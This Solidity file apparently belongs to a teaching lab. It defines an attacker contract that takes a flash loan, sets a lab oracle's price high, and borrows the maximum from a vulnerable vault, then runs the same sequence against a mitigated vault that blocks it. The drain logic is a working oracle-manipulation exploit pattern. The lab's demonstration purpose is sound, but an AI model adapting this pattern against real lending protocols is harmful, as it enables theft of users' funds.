// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./MockERC20.sol";
import "./LabOracle.sol";
import "./FlashLoanPool.sol";
import "./VulnerableVault.sol";
import "./MitigatedVault.sol";

/// @title LabAttacker — educational same-tx flash loan + oracle spike harness
/// @dev Lab-only. Demo tokens. Not a mainnet exploit toolkit.
contract LabAttacker is IFlashLoanReceiver {
    FlashLoanPool public immutable pool;
    LabOracle public immutable oracle;
    MockERC20 public immutable collateral;
    MockERC20 public immutable debtAsset;
    VulnerableVault public immutable vuln;
    MitigatedVault public immutable mit;

    uint256 public lastBorrowed;
    bool public lastSuccess;
    string public lastReason;

    constructor(
        FlashLoanPool pool_,
        LabOracle oracle_,
        MockERC20 collateral_,
        MockERC20 debtAsset_,
        VulnerableVault vuln_,
        MitigatedVault mit_
    ) {
        pool = pool_;
        oracle = oracle_;
        collateral = collateral_;
        debtAsset = debtAsset_;
        vuln = vuln_;
        mit = mit_;
    }

    function attackVulnerable(uint256 flashAmount, uint256 depositAmount, uint256 spikePrice) external {
        bytes memory data = abi.encode(uint8(0), depositAmount, spikePrice);
        pool.flashLoan(flashAmount, data);
    }

    function attackMitigated(uint256 flashAmount, uint256 depositAmount, uint256 spikePrice) external {
        bytes memory data = abi.encode(uint8(1), depositAmount, spikePrice);
        pool.flashLoan(flashAmount, data);
    }

    function onFlashLoan(address, uint256 amount, uint256, bytes calldata data) external override {
        require(msg.sender == address(pool), "LabAttacker: pool only");
        (uint8 mode, uint256 depositAmount, uint256 spikePrice) = abi.decode(data, (uint8, uint256, uint256));
        require(collateral.balanceOf(address(this)) >= amount + depositAmount, "LabAttacker: seed collateral");

        oracle.setSpotPrice(spikePrice);

        if (mode == 0) {
            collateral.approve(address(vuln), depositAmount);
            vuln.depositCollateral(depositAmount);
            uint256 canBorrow = vuln.maxBorrow(address(this));
            uint256 vaultLiq = debtAsset.balanceOf(address(vuln));
            uint256 take = canBorrow < vaultLiq ? canBorrow : vaultLiq;
            if (take > 0) {
                vuln.borrow(take);
                lastBorrowed = take;
                lastSuccess = true;
                lastReason = "vulnerable lab drain succeeded";
            } else {
                lastBorrowed = 0;
                lastSuccess = false;
                lastReason = "no borrow capacity";
            }
        } else {
            collateral.approve(address(mit), depositAmount);
            mit.depositCollateral(depositAmount);
            uint256 want = mit.maxBorrow(address(this));
            if (want == 0) want = 1;
            try mit.borrow(want) {
                lastBorrowed = want;
                lastSuccess = true;
                lastReason = "unexpected: mitigated allowed borrow";
            } catch Error(string memory reason) {
                lastBorrowed = 0;
                lastSuccess = false;
                lastReason = reason;
            } catch {
                lastBorrowed = 0;
                lastSuccess = false;
                lastReason = "MitigatedVault: blocked";
            }
        }

        require(collateral.transfer(address(pool), amount), "LabAttacker: repay flash");
    }
}
